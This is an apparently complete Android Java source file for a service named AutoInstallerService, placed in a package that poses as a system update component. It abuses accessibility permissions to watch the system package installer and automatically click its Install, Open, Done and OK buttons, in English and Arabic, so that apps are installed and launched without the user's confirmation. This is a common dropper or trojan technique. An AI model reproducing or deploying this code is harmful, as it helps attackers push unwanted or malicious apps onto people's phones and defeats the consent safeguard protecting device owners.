package com.system.updates.services;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

public class AutoInstallerService extends AccessibilityService {

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        CharSequence packageName = event.getPackageName();
        if (packageName == null || !packageName.toString().equals("com.android.packageinstaller")) {
            return;
        }

        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED || 
            event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode == null) return;

            String[] targetButtons = {"Install", "تثبيت", "Open", "فتح", "Done", "تم", "OK", "موافق"};

            for (String text : targetButtons) {
                List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByText(text);
                for (AccessibilityNodeInfo node : nodes) {
                    if (node.isClickable() && node.isEnabled()) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    }
                }
            }
            rootNode.recycle();
        }
    }

    @Override
    public void onInterrupt() {
    }
}
